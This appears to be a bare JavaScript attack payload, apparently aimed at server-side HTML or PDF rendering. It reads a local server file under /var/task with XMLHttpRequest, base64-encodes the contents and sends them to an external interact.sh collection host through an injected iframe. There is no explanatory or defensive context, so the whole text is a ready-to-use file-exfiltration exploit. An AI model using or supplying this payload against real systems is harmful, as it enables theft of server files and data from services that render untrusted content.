function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    document.write('<iframe src="https://cbcaaeh2vtc00002net0gfsff8cyyyyyb.interact.sh/exfil?data='+b64+'"></iframe>');
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///var/task/[redacted].html"); 
oReq.send();
